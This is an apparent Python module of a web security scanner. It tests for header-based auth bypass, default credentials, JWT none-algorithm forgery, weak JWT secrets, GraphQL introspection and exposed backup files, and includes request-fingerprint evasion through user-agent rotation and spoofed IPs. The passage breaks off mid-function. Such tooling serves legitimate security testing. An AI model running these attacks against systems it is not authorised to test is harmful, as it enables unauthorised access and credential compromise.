"""Authentication, JWT, OAuth, session, and credential security modules."""
import re
import json
import time
import base64
import hmac
import hashlib
import datetime
import secrets
from urllib.parse import urlparse
import threading
from core.utils import _find_tool, _run_tool, req_lib, REQUESTS_AVAILABLE
from core.logger import log
from scanner.state import scan_state, LOCK
from scanner.findings import add_finding, set_progress


# ── Auth bypass detection constants ─────────────────────────────────────────

def _levenshtein_ratio(s1, s2):
    """Compute similarity ratio between two strings (0.0 to 1.0)."""
    if not s1 or not s2:
        return 0.0
    try:
        from Levenshtein import ratio as _lev_ratio
        return _lev_ratio(s1, s2)
    except ImportError:
        pass
    t1 = set(s1.lower().split())
    t2 = set(s2.lower().split())
    if not t1 or not t2:
        return 0.0
    return len(t1 & t2) / max(len(t1), len(t2))


_AUTH_BYPASS_DENY_LIST = [
    'unauthorized', 'unauthenticated', 'access denied',
    'login required', 'please login', 'sign in',
    'invalid token', 'token expired', 'missing token',
    'authentication required', 'permission denied',
    '403 forbidden', '401 unauthorized',
    'redirecting to login', 'login form',
    'not authenticated', 'not logged in',
    'session expired', 'please authenticate',
    'you must be logged in', 'login to continue',
    'access has been denied', 'credentials required',
]

_AUTH_BYPASS_ALLOW_LIST = [
    'admin panel', 'administrator panel', 'admin dashboard',
    'user management', 'user administration', 'user list',
    'system configuration', 'server configuration',
    'database management', 'database admin',
    'phpmyadmin', 'adminer', 'pgadmin',
    'phpinfo()', 'php version',
    'server status', 'server info',
    'debug toolbar', 'debug console', 'debugger',
    'file manager', 'file browser',
    'shell access', 'terminal access', 'command execution',
    'backup management', 'restore backup',
]

_AUTH_BYPASS_STATIC_EXT = (
    '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.webp',
    '.woff', '.woff2', '.ttf', '.eot', '.otf', '.map',
)

_AUTH_BYPASS_HEADERS = [
    ('X-Forwarded-For', '127.0.0.1'),
    ('X-Forwarded-For', '127.0.0.1, 127.0.0.1'),
    ('X-Real-IP', '127.0.0.1'),
    ('X-Original-URL', '/admin'),
    ('X-Rewrite-URL', '/admin'),
    ('X-Forwarded-Host', '127.0.0.1'),
    ('X-Host', '127.0.0.1'),
    ('X-Forwarded-Scheme', 'no-cache'),
    ('X-Client-IP', '127.0.0.1'),
    ('X-Remote-IP', '127.0.0.1'),
    ('X-Remote-Addr', '127.0.0.1'),
    ('X-Proxy-Host', '127.0.0.1'),
    ('Forwarded', 'for=127.0.0.1;by=127.0.0.1;host=127.0.0.1'),
]


def _auth_bypass_classify(test_status, baseline_status, test_body, baseline_body,
                          test_location, endpoint, header_name):
    """Apply the 8-step detection flowchart. Returns (verdict, reason, pattern_id)."""
    REDIRECT_STATUSES = {301, 302, 303, 307, 308}

    if test_status in REDIRECT_STATUSES:
        return ('FALSE_POSITIVE', f'Redirect detected ({test_status}) to {test_location}',
                'FP-REDIRECT')

    if baseline_status not in (401, 403) and test_status == 200:
        return ('FALSE_POSITIVE', f'Baseline already allowed access (status {baseline_status})',
                'FP-NO_PRIVILEGE_ESCALATION')

    body_lower = (test_body or '').lower()
    for deny in _AUTH_BYPASS_DENY_LIST:
        if deny in body_lower:
            return ('FALSE_POSITIVE',
                    f'Response contains "{deny}" — authentication still required',
                    'FP-AUTH_REQUIRED_IN_RESPONSE')

    has_admin_content = any(ind in body_lower for ind in _AUTH_BYPASS_ALLOW_LIST)
    if not has_admin_content:
        return ('FALSE_POSITIVE',
                'Response lacks admin/sensitive content indicators',
                'FP-NO_ADMIN_INDICATORS')

    ratio = _levenshtein_ratio(baseline_body or '', test_body or '')
    if ratio > 0.70:
        return ('FALSE_POSITIVE',
                f'Response similar to baseline (similarity={ratio:.0%})',
                'FP-SAME_CONTENT')

    has_admin = any(ind in body_lower for ind in ['admin', 'dashboard', 'settings',
                                                    'users', 'configuration', 'control panel'])
    severity = 'critical' if has_admin else 'high'
    return ('CONFIRMED_BYPASS',
            f'Header {header_name} bypasses authentication at {endpoint} (admin={has_admin})',
            severity)


# ── ScanSession helpers ───────────────────────────────────────────────────────

_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
]


def _header_shuffle(headers_dict):
    """Shuffle non-essential header order per request to avoid fingerprinting."""
    import random
    essential = ['User-Agent', 'Connection']
    ordered = [(k, headers_dict[k]) for k in essential if k in headers_dict]
    non_essential = [(k, headers_dict[k]) for k in headers_dict if k not in essential]
    random.shuffle(non_essential)
    return ordered + non_essential


def _spoof_xff():
    """Generate a random plausible public IP for X-Forwarded-For."""
    import random
    while True:
        ip = f'{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'
        first = int(ip.split('.')[0])
        if first in (10, 127):
            continue
        if first == 172 and 16 <= int(ip.split('.')[1]) <= 31:
            continue
        if first == 192 and int(ip.split('.')[1]) == 168:
            continue
        return ip


class ScanSession:
    """Shared session with cookie persistence, retry logic, WAF awareness,
    per-request UA rotation, timing jitter, X-Forwarded-For spoofing,
    and header order shuffling."""
    _instance = None
    _lock = threading.Lock()

    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
                cls._instance._session = req_lib.Session()
                cls._instance._session.verify = False
                cls._instance._session.headers.update({
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                })
                cls._instance._authenticated = False
                cls._instance._login_url = None
                cls._instance._waf_detected = None
                cls._instance._jitter = (0, 0)
            return cls._instance

    def _apply_fingerprint(self, kwargs):
        """Per-request: rotate UA, jitter, spoof XFF, shuffle headers."""
        import random
        headers = dict(kwargs.get('headers', {}))
        headers['User-Agent'] = random.choice(_USER_AGENTS)
        headers['X-Forwarded-For'] = _spoof_xff()
        base_headers = dict(self._session.headers)
        base_headers.update(headers)
        ordered = _header_shuffle(base_headers)
        kwargs['headers'] = dict(ordered)
        if self._jitter and self._jitter != (0, 0):
            time.sleep(random.uniform(self._jitter[0], self._jitter[1]))

    def set_jitter(self, jitter_range):
        """Set per-request timing jitter (min_seconds, max_seconds)."""
        self._jitter = jitter_range

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', 10)
        kwargs.setdefault('verify', False)
        self._apply_fingerprint(kwargs)
        for attempt in range(2):
            try:
                r = self._session.get(url, **kwargs)
                if r.status_code == 429:
                    wait = int(r.headers.get('Retry-After', 5))
                    log('warn', f'[SESSION] Rate limited, waiting {wait}s')
                    time.sleep(wait)
                    continue
                return r
            except Exception:
                if attempt == 0:
                    time.sleep(1)
                    continue
                raise
        return None

    def post(self, url, **kwargs):
        kwargs.setdefault('timeout', 10)
        kwargs.setdefault('verify', False)
        self._apply_fingerprint(kwargs)
        for attempt in range(2):
            try:
                r = self._session.post(url, **kwargs)
                if r.status_code == 429:
                    wait = int(r.headers.get('Retry-After', 5))
                    log('warn', f'[SESSION] Rate limited, waiting {wait}s')
                    time.sleep(wait)
                    continue
                return r
            except Exception:
                if attempt == 0:
                    time.sleep(1)
                    continue
                raise
        return None

def run_auth_test_module(target):
    """Production-grade authentication bypass detection engine.

    Follows strict 8-step flowchart methodology:
    1. Baseline request (no modifications, redirects OFF)
    2. For each bypass header: send test request (redirects OFF)
    3. Redirect check → FALSE_POSITIVE
    4. Status escalation check → FALSE_POSITIVE
    5. Content validation (deny list) → FALSE_POSITIVE
    6. Admin content verification (allow list) → FALSE_POSITIVE
    7. Content difference check (Levenshtein) → FALSE_POSITIVE
    8. Confirmed bypass → CRITICAL/HIGH
    """
    log('info', '[AUTH] Starting authentication bypass detection engine (8-step flowchart)')
    base_url = f'https://{target}'
    auth_findings = []
    bypass_results = []  # Full test results for JSON output

    with LOCK:
        disc = scan_state.get('discovery_data', {})
        forms = disc.get('forms', [])
        urls = disc.get('urls', [])

    # ── Step 1: Discover endpoints to test ──
    endpoints = [
        '/admin', '/admin/login', '/wp-admin', '/administrator',
        '/login', '/user/login', '/signin', '/auth',
        '/dashboard', '/console', '/panel', '/manage',
        '/api/admin', '/api/users', '/api/settings', '/api/config',
        '/api/v1/admin', '/api/v1/users',
        '/graphql', '/debug', '/trace', '/actuator',
        '/.env', '/server-status', '/server-info',
        '/backup', '/phpmyadmin', '/adminer',
    ]

    # Add discovered URLs that look like protected endpoints
    for url in urls:
        path = urlparse(url).path.lower()
        if any(kw in path for kw in ['admin', 'dashboard', 'manage', 'settings',
                                       'config', 'backup', 'debug', 'api']):
            if path not in endpoints:
                endpoints.append(path)

    # Also add from forms
    for form in forms:
        action = form.get('action', '')
        if action and action.startswith('/'):
            endpoints.append(action)

    # Deduplicate, skip static assets
    seen = set()
    filtered_endpoints = []
    for ep in endpoints:
        if ep in seen:
            continue
        if any(ep.endswith(ext) for ext in _AUTH_BYPASS_STATIC_EXT):
            continue
        seen.add(ep)
        filtered_endpoints.append(ep)
    endpoints = filtered_endpoints

    log('info', f'[AUTH] Testing {len(endpoints)} endpoints with {len(_AUTH_BYPASS_HEADERS)} bypass headers')

    # ── Default credentials test (kept from original) ──
    default_creds = [
        ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
        ('admin', 'admin123'), ('admin', 'admin1234'), ('admin', 'pass123'),
        ('root', 'root'), ('root', 'toor'), ('root', 'password'),
        ('administrator', 'administrator'), ('administrator', 'password'),
        ('admin', 'letmein'), ('admin', 'welcome'), ('admin', 'changeme'),
        ('test', 'test'), ('test', 'password'), ('guest', 'guest'),
        ('user', 'user'), ('demo', 'demo'), ('admin', 'trustno1'),
    ]

    login_forms = []
    for form in forms:
        inputs = form.get('inputs', [])
        has_password = any(i.get('type', '') == 'password' or
                          'pass' in i.get('name', '').lower()
                          for i in inputs)
        if has_password:
            action = form.get('action', '')
            if action:
                form_url = action if action.startswith('http') else f'{base_url}{action}'
                login_forms.append({'url': form_url, 'inputs': inputs})

    for login_form in login_forms[:3]:
        if not scan_state.get('scanning'):
            break
        try:
            data_baseline = {}
            for inp in login_form['inputs']:
                name = inp.get('name', '')
                if name:
                    data_baseline[name] = inp.get('value', 'test')
            r_baseline = req_lib.post(login_form['url'], data=data_baseline,
                                       timeout=8, verify=False, allow_redirects=False)
        except Exception:
            continue

        for username, password in default_creds:
            try:
                data = {}
                for inp in login_form['inputs']:
                    name = inp.get('name', '').lower()
                    original_name = inp.get('name', '')
                    if 'user' in name or 'email' in name or 'login' in name:
                        data[original_name] = username
                    elif 'pass' in name:
                        data[original_name] = password
                    else:
                        data[original_name] = inp.get('value', 'test')

                r = req_lib.post(login_form['url'], data=data, timeout=8,
                                  verify=False, allow_redirects=False)

                success_indicators = ['dashboard', 'welcome', 'logout', 'profile',
                                    'admin panel', 'my account', 'sign out',
                                    'settings', 'console', 'control panel', 'manage']
                failure_indicators = ['invalid', 'incorrect', 'wrong', 'failed',
                                    'unauthorized', 'forbidden', 'denied',
                                    'does not match', 'try again']

                response_lower = r.text.lower()
                is_success = any(ind in response_lower for ind in success_indicators)
                is_failure = any(ind in response_lower for ind in failure_indicators)

                if is_success and not is_failure:
                    cred_finding = add_finding(
                        'critical',
                        f'Default credentials accepted: {username}:{password}',
                        sub=f'Login at {login_form["url"]} accepts default credentials',
                        asset=login_form['url'], cvss='9.8', owasp='A07', mitre='T1078',
                        details=f'Username: {username}\nPassword: {password}\n'
                                f'Login URL: {login_form["url"]}\n'
                                f'Response: {r.status_code} ({len(r.text)} bytes)\n'
                                f'Baseline: {r_baseline.status_code} ({len(r_baseline.text)} bytes)\n'
                                f'Success indicators: {[i for i in success_indicators if i in response_lower][:3]}\n\n'
                                f'Reproduction:\ncurl -k -X POST "{login_form["url"]}" '
                                f'-d "username={username}&password={password}"\n\n'
                                f'Remediation: Change all default credentials immediately.')
                    auth_findings.append({'type': 'default_creds', 'user': username,
                                          'endpoint': login_form['url']})
                    log('ok', f'[AUTH] Default creds found: {username}:{password}')
                    break
            except Exception:
                pass

    # ── Step 2-8: Auth bypass via header manipulation (8-step flowchart) ──
    confirmed_bypasses = []
    fp_counts = {'REDIRECT': 0, 'AUTH_REQUIRED': 0, 'NO_ADMIN': 0,
                 'SAME_CONTENT': 0, 'NO_ESCALATION': 0}

    for endpoint in endpoints:
        if not scan_state.get('scanning'):
            break
        test_url = f'{base_url}{endpoint}'
        endpoint_results = {
            'endpoint': endpoint,
            'tested_headers': [],
            'baseline': None,
            'tests': [],
            'confirmed_bypasses': [],
        }

        # Step 1: Baseline request (redirects OFF)
        try:
            r_baseline = req_lib.get(test_url, timeout=8, verify=False,
                                      allow_redirects=False)
            baseline_status = r_baseline.status_code
            baseline_body = r_baseline.text[:2000]
            baseline_len = len(r_baseline.text)
            baseline_location = r_baseline.headers.get('Location', '')
            endpoint_results['baseline'] = {
                'status_code': baseline_status,
                'content_length': baseline_len,
                'location': baseline_location,
                'content_sample': baseline_body[:500],
            }
        except Exception as e:
            log('warn', f'[AUTH] Baseline failed for {endpoint}: {e}')
            continue

        # Step 2: For each bypass header
        for header_name, header_value in _AUTH_BYPASS_HEADERS:
            if not scan_state.get('scanning'):
                break

            endpoint_results['tested_headers'].append(f'{header_name}: {header_value}')

            try:
                r_test = req_lib.get(test_url, headers={header_name: header_value},
                                      timeout=8, verify=False, allow_redirects=False)
                test_status = r_test.status_code
                test_body = r_test.text[:2000]
                test_len = len(r_test.text)
                test_location = r_test.headers.get('Location', '')
            except Exception:
                continue

            # Steps 3-8: Classification flowchart
            verdict, reason, pattern_id = _auth_bypass_classify(
                test_status, baseline_status, test_body, baseline_body,
                test_location, endpoint, header_name)

            test_result = {
                'header': header_name,
                'value': header_value,
                'status_code': test_status,
                'location': test_location,
                'content_length': test_len,
                'verdict': verdict,
                'reason': reason,
                'pattern_matched': pattern_id,
            }
            endpoint_results['tests'].append(test_result)

            if verdict == 'CONFIRMED_BYPASS':
                severity = pattern_id  # 'critical' or 'high'
                reproduction = (
                    f'# Reproduction command:\n'
                    f'curl -k -I --max-redirs 0 -H "{header_name}: {header_value}" '
                    f'"{test_url}"\n\n'
                    f'# Full response:\n'
                    f'curl -k --max-redirs 0 -H "{header_name}: {header_value}" '
                    f'"{test_url}" -v 2>&1\n\n'
                    f'# Baseline comparison:\n'
                    f'curl -k -I --max-redirs 0 "{test_url}"'
                )

                bypass_finding = add_finding(
                    severity,
                    f'Auth bypass via {header_name} at {endpoint}',
                    sub=reason,
                    asset=test_url,
                    cvss='9.5' if severity == 'critical' else '8.0',
                    owasp='A01', mitre='T1190',
                    details=f'Header: {header_name}: {header_value}\n'
                            f'Endpoint: {endpoint}\n'
                            f'Baseline: {baseline_status} ({baseline_len} bytes)\n'
                            f'Bypass Response: {test_status} ({test_len} bytes)\n'
                            f'Admin Content: Yes\n'
                            f'Content Similarity: {1 - _levenshtein_ratio(baseline_body, test_body):.0%} different\n\n'
                            f'{reproduction}\n\n'
                            f'Remediation: Remove trust in client-supplied headers. '
                            f'Authenticate based on the actual TCP connection, not proxy headers.')
                auth_findings.append({
                    'type': 'auth_bypass',
                    'endpoint': endpoint,
                    'header': header_name,
                    'severity': severity,
                })
                confirmed_bypasses.append(test_result)
                endpoint_results['confirmed_bypasses'].append(test_result)
                log('ok', f'[AUTH] CONFIRMED BYPASS via {header_name} at {endpoint} ({severity})')
            else:
                # Track false positive reasons
                if 'REDIRECT' in pattern_id:
                    fp_counts['REDIRECT'] += 1
                elif 'AUTH_REQUIRED' in pattern_id:
                    fp_counts['AUTH_REQUIRED'] += 1
                elif 'NO_ADMIN' in pattern_id:
                    fp_counts['NO_ADMIN'] += 1
                elif 'SAME_CONTENT' in pattern_id:
                    fp_counts['SAME_CONTENT'] += 1
                elif 'NO_ESCALATION' in pattern_id:
                    fp_counts['NO_ESCALATION'] += 1

        bypass_results.append(endpoint_results)

    # ── Step 4 (original): Session security analysis ──
    try:
        r = req_lib.get(base_url, timeout=8, verify=False, allow_redirects=False)
        for cookie_name in r.cookies:
            is_session = any(kw in cookie_name.lower()
                           for kw in ['session', 'sid', 'token', 'auth'])
            if is_session:
                cookie = r.cookies.get(cookie_name)
                if cookie and not cookie.has_nonstandard_attr('HttpOnly'):
                    add_finding(
                        'medium',
                        f'Session cookie {cookie_name} missing HttpOnly flag',
                        sub=f'Cookie {cookie_name} accessible via JavaScript',
                        asset=base_url, cvss='5.0', owasp='A05', mitre='T1185',
                        details=f'Cookie: {cookie_name}\nHttpOnly: Not set\n'
                                f'Confirmed: Session cookie accessible via document.cookie\n\n'
                                f'Remediation: Set HttpOnly flag on all session cookies.')
    except Exception:
        pass

    # ── GraphQL introspection check (separate category, NOT auth bypass) ──
    graphql_endpoints = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']
    for ep in graphql_endpoints:
        if not scan_state.get('scanning'):
            break
        gql_url = f'{base_url}{ep}'
        try:
            r = req_lib.post(gql_url, json={'query': '{ __schema { types { name } } }'},
                              timeout=8, verify=False, allow_redirects=False)
            if r.status_code == 200 and '__schema' in r.text:
                # False-positive guard: response must be JSON with actual type data
                content_type = r.headers.get('content-type', '')
                is_json = 'json' in content_type
                if not is_json:
                    try:
                        import json as _j
                        _j.loads(r.text)
                        is_json = True
                    except Exception:
                        pass
                if is_json and '"types"' in r.text:
                    add_finding(
                        'medium',
                        f'GraphQL introspection enabled at {ep}',
                        sub='GraphQL schema can be enumerated to discover all types and queries',
                        asset=gql_url, cvss='5.3', owasp='A03', mitre='T1190',
                        details=f'Endpoint: {ep}\nResponse: {r.status_code}\n'
                                f'Schema exposed: Yes\n\n'
                                f'Reproduction:\ncurl -k -X POST "{gql_url}" '
                                f'-H "Content-Type: application/json" '
                                f"-d '{{\"query\":\"{{ __schema {{ types {{ name }} }} }}\"}}'\n\n"
                                f'Remediation: Disable GraphQL introspection in production.')
        except Exception:
            pass

    # ── Backup file check (separate category) ──
    backup_paths = ['/.env', '/.env.bak', '/.env.old', '/.env.save',
                    '/config.bak', '/config.old', '/database.sql',
                    '/backup.sql', '/dump.sql', '/.git/config',
                    '/web.config.bak', '/.htaccess.bak']
    # Get baseline homepage for comparison
    try:
        r_baseline_hp = req_lib.get(base_url, timeout=5, verify=False, allow_redirects=False)
        baseline_hp_text = r_baseline_hp.text[:2000] if r_baseline_hp else ''
    except Exception:
        baseline_hp_text = ''
    for bp in backup_paths:
        if not scan_state.get('scanning'):
            break
        try:
            r = req_lib.get(f'{base_url}{bp}', timeout=5, verify=False, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 10:
                # False-positive guard: compare with baseline homepage
                # If content is very similar (>70%), it's just the normal page served for all URLs
                if baseline_hp_text:
                    content_similar = _levenshtein_ratio(baseline_hp_text[:1500], r.text[:1500]) > 0.70
                    if content_similar:
                        continue
                add_finding(
                    'medium',
                    f'Backup file accessible: {bp}',
                    sub=f'File {bp} is publicly accessible and may contain sensitive data',
                    asset=f'{base_url}{bp}', cvss='5.3', owasp='A01', mitre='T1005',
                    details=f'Path: {bp}\nStatus: {r.status_code}\nSize: {len(r.text)} bytes\n'
                            f'Content sample: {r.text[:200]}\n\n'
                            f'Reproduction:\ncurl -k "{base_url}{bp}"\n\n'
                            f'Remediation: Remove backup files from web-accessible directories.')
        except Exception:
            pass

    # ── Summary ──
    total_tests = sum(len(ep_res['tests']) for ep_res in bypass_results)
    log('ok', f'[AUTH] Scan complete: {len(confirmed_bypasses)} confirmed bypasses, '
              f'{total_tests} total tests, {sum(fp_counts.values())} false positives eliminated')

    with LOCK:
        scan_state['auth_bypass_data'] = {
            'confirmed_bypasses': confirmed_bypasses,
            'false_positives': fp_counts,
            'total_tests': total_tests,
            'endpoints_tested': len(bypass_results),
            'results': bypass_results,
        }
    set_progress('auth', 100)


# ─── SSTI (SERVER-SIDE TEMPLATE INJECTION) ────────────────────────────────────


def run_jwt_test_module(target):
    """Test for JWT vulnerabilities (none algorithm, weak keys, expired tokens)."""
    log('info', f'[JWT] Testing JWT vulnerabilities on {target}')
    base_url = f'https://{target}'
    jwt_findings = []

    # Check if there are JWT tokens in cookies or responses
    try:
        r = req_lib.get(base_url, timeout=10, verify=False)
        jwt_tokens = []

        # Check cookies for JWT
        for cookie in r.cookies:
            val = str(r.cookies[cookie])
            if val.count('.') == 2 and len(val) > 50:
                jwt_tokens.append(val)
                log('info', f'[JWT] Found JWT token in cookie: {cookie}')

        # Check response body for JWT
        import re as re_mod
        jwt_pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
        found_tokens = re_mod.findall(jwt_pattern, r.text)
        jwt_tokens.extend(found_tokens)

        if not jwt_tokens:
            log('info', '[JWT] No JWT tokens found in initial request')
            set_progress('jwt', 100)
            return

        for token in jwt_tokens[:3]:
            try:
                parts = token.split('.')
                import base64 as b64_mod
                # Decode header
                header_pad = parts[0] + '=' * (4 - len(parts[0]) % 4)
                header = json.loads(b64_mod.urlsafe_b64decode(header_pad))

                # Test 1: None algorithm attack
                if header.get('alg') == 'HS256' or header.get('alg') == 'RS256':
                    none_header = json.dumps({'alg': 'none', 'typ': header.get('typ', 'JWT')})
                    none_header_b64 = b64_mod.urlsafe_b64encode(none_header.encode()).rstrip(b'=').decode()
                    forged_token = f'{none_header_b64}.{parts[1]}.'

                    # Test with forged token
                    test_urls = [
                        f'{base_url}/api/user/profile',
                        f'{base_url}/api/auth/verify',
                        f'{base_url}/api/me',
                        f'{base_url}/dashboard',
                    ]
                    for test_url in test_urls:
                        try:
                            r2 = req_lib.get(test_url, cookies={'token': forged_token, 'jwt': forged_token},
                                            headers={'Authorization': f'Bearer {forged_token}'},
                                            timeout=8, verify=False)
                            if r2.status_code in (200, 201) and 'unauthorized' not in r2.text.lower():
                                add_finding(
                                    'critical',
                                    'JWT "none" algorithm attack successful',
                                    sub='Token forged with alg=none and accepted by server',
                                    asset=test_url, cvss='9.8', owasp='A02', mitre='T1550',
                                    details=f'Original algorithm: {header.get("alg")}\n'
                                            f'Forged token: {forged_token[:50]}...\n'
                                            f'Response: {r2.status_code}\n'
                                            f'Confirmed: Server accepts unsigned tokens')
                                jwt_findings.append({'type': 'none_alg', 'url': test_url})
                                log('ok', f'[JWT] None algorithm attack successful on {test_url}')
                                break
                        except Exception:
                            pass

                # Test 2: Check for weak secret (common passwords)
                if header.get('alg') in ('HS256', 'HS384', 'HS512'):
                    common_secrets = ['secret', 'password', '123456', 'jwt_secret',
                                     'supersecret', 'key', 'test', 'changeme']
                    for secret in common_secrets:
                        try:
                            import hmac as hmac_mod
                            test_sig = hmac_mod.new(secret.encode(),
                                                   f'{parts[0]}.{parts[1]}'.encode(),
                                                   'sha256').hexdigest()
                            # Compare with original (base64url decode)
                            sig_pad = parts[2] + '=' * (4 - len(parts[2]) % 4)
                            orig_sig = b64_mod.urlsafe_b64decode(sig_pad).hex()
                            if test_sig == orig_sig:
                                add_finding(
                                    'critical',
                                    'JWT signed with weak secret',
                                    sub=f'Token signed with common secret: {secret}',
                                    asset=base_url, cvss='8.5', owasp='A02', mitre='T1550',
                                    details=f'Weak secret found: {secret}\n'
                                            f'Algorithm: {header.get("alg")}\n'
                                            f'Confirmed: Signature matches known secret')
                                jwt_findings.append({'type': 'weak_secret', 'secret': secret})
                                log('ok', f'[JWT] Weak secret found: {secret}')
                                break
                        except Exception:
                            pass

            except Exception as e:
                log('warn', f'[JWT] Token analysis error: {e}')

    except Exception as e:
        log('warn', f'[JWT] Scan error: {e}')

    log('ok', f'[JWT] Scan complete — {len(jwt_findings)} JWT findings')
    set_progress('jwt', 100)


# ─── GRAPHQL SECURITY MODULE ───────────────────────────────────────────────────


def run_jwt_attack_module(target):
    """Production-grade JWT attack detection.
    
    Real logic:
    1. Find JWT tokens in cookies and Authorization headers
    2. Test none algorithm bypass
    3. Test weak secret via wordlist brute-force
    4. Test algorithm confusion (RS256 → HS256)
    5. Test key injection
    6. Test expiration bypass
    7. Confirmation: verify forged token is accepted
    """
    log('info', '[JWT-ADV] Starting production-grade JWT testing')
    base_url = f'https://{target}'
    jwt_findings = []

    import base64 as b64
    import hmac as _hmac

    # ── Step 1: Find JWT tokens ──
    jwt_tokens = []
    try:
        r = req_lib.get(base_url, timeout=8, verify=False)
        for cookie_name, cookie_val in r.cookies.items():
            if cookie_val.count('.') == 2:
                jwt_tokens.append({'source': 'cookie', 'name': cookie_name, 'token': cookie_val})
        auth_header = r.headers.get('Authorization', '')
        if auth_header.startswith('Bearer ') and auth_header[7:].count('.') == 2:
            jwt_tokens.append({'source': 'header', 'name': 'Authorization', 'token': auth_header[7:]})
    except Exception:
        set_progress('jwt_adv', 100)
        return

    if not jwt_tokens:
        log('info', '[JWT-ADV] No JWT tokens found')
        set_progress('jwt_adv', 100)
        return

    # ── Step 2: Common weak secrets ──
    common_secrets = [
        'secret', 'password', '123456', 'jwt_secret', 'supersecret', 'key',
        'test', 'changeme', 'shhhhh', 'keyboard cat', 'mysecret', 'secretkey',
        'jwt_secret_key', 'super_secret', 'top_secret', 'admin', 'root',
        'pass123', 'qwerty', 'abc123', '123456789', 'letmein', 'welcome',
        'monkey', 'dragon', 'master', 'login', 'princess', 'football',
        'shadow', 'sunshine', 'trustno1', 'iloveyou', 'batman', 'access',
        'hello', 'charlie', 'donald', 'password1', 'password123', '12345678',
        '1234567890', 'base64secret', 'hs256secret', 'symmetric_key',
        'jwt-key', 'token-secret', 'auth-secret', 'session-secret',
        'super-key', 'my-key', 'the-key', 'a-secret', 'my-secret',
    ]

    # ── Step 3: Test each token ──
    for jwt_info in jwt_tokens:
        token = jwt_info['token']
        parts = token.split('.')
        if len(parts) != 3:
            continue

        try:
            # Decode header
            header_pad = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(b64.urlsafe_b64decode(header_pad))

            # Decode payload
            payload_pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(b64.urlsafe_b64decode(payload_pad))

            log('info', f'[JWT-ADV] Token found: alg={header.get("alg")}, exp={payload.get("exp", "none")}')

            # ── Test 1: None algorithm ──
            if header.get('alg') in ('HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'PS256', 'PS384', 'PS512'):
                for none_variant in ['none', 'None', 'NONE', 'nOnE']:
                    none_header = json.dumps({'alg': none_variant, 'typ': header.get('typ', 'JWT')})
                    none_b64 = b64.urlsafe_b64encode(none_header.encode()).rstrip(b'=').decode()
                    forged = f'{none_b64}.{parts[1]}.'

                    # Test on multiple endpoints
                    test_endpoints = ['/api/user/profile', '/api/auth/verify', '/api/me',
                                    '/dashboard', '/profile', '/api/v1/me', '/user/profile']
                    for test_ep in test_endpoints:
                        try:
                            r2 = req_lib.get(f'{base_url}{test_ep}',
                                            cookies={jwt_info['name']: forged} if jwt_info['source'] == 'cookie' else {},
                                            headers={'Authorization': f'Bearer {forged}'},
                                            timeout=5, verify=False)
                            if r2.status_code in (200, 201):
                                resp_lower = r2.text.lower()
                                if 'unauthorized' not in resp_lower and 'forbidden' not in resp_lower and 'invalid' not in resp_lower:
                                    add_finding(
                                        'critical',
                                        f'JWT none algorithm bypass via {jwt_info["name"]}',
                                        sub=f'Token forged with alg={none_variant} and accepted by server',
                                        asset=f'{base_url}{test_ep}', cvss='9.8', owasp='A02', mitre='T1550',
                                        details=f'Token source: {jwt_info["source"]}\n'
                                                f'Original alg: {header.get("alg")}\n'
                                                f'Forged alg: {none_variant}\n'
                                                f'Test endpoint: {test_ep}\n'
                                                f'Forged token: {forged[:50]}...\n'
                                                f'Confirmed: Server accepts unsigned tokens\n'
                                                f'Exploit: python3 jwt_tool.py {token} -S none')
                                    jwt_findings.append({'type': 'none_alg', 'cookie': jwt_info['name']})
                                    log('ok', f'[JWT-ADV] None algorithm confirmed (alg={none_variant})')
                                    break
                        except Exception:
                            pass

            # ── Test 2: Weak secret brute-force ──
            if header.get('alg') in ('HS256', 'HS384', 'HS512'):
                alg_hash = 'sha256' if header.get('alg') == 'HS256' else 'sha384' if header.get('alg') == 'HS384' else 'sha512'
                original_sig = b64.urlsafe_b64decode(parts[2] + '=' * (4 - len(parts[2]) % 4))
                signing_input = f'{parts[0]}.{parts[1]}'.encode()

                for secret in common_secrets:
                    try:
                        test_sig = _hmac.new(secret.encode(), signing_input, alg_hash).digest()
                        if test_sig == original_sig:
                            add_finding(
                                'critical',
                                f'JWT weak secret: "{secret}"',
                                sub=f'Token signed with common secret key',
                                asset=base_url, cvss='8.5', owasp='A02', mitre='T1550',
                                details=f'Secret: {secret}\nAlgorithm: {header.get("alg")}\n'
                                        f'Token: {token[:50]}...\n'
                                        f'Confirmed: Signature matches known weak secret\n'
                                        f'Exploit: hashcat -m 16500 jwt.txt wordlist.txt')
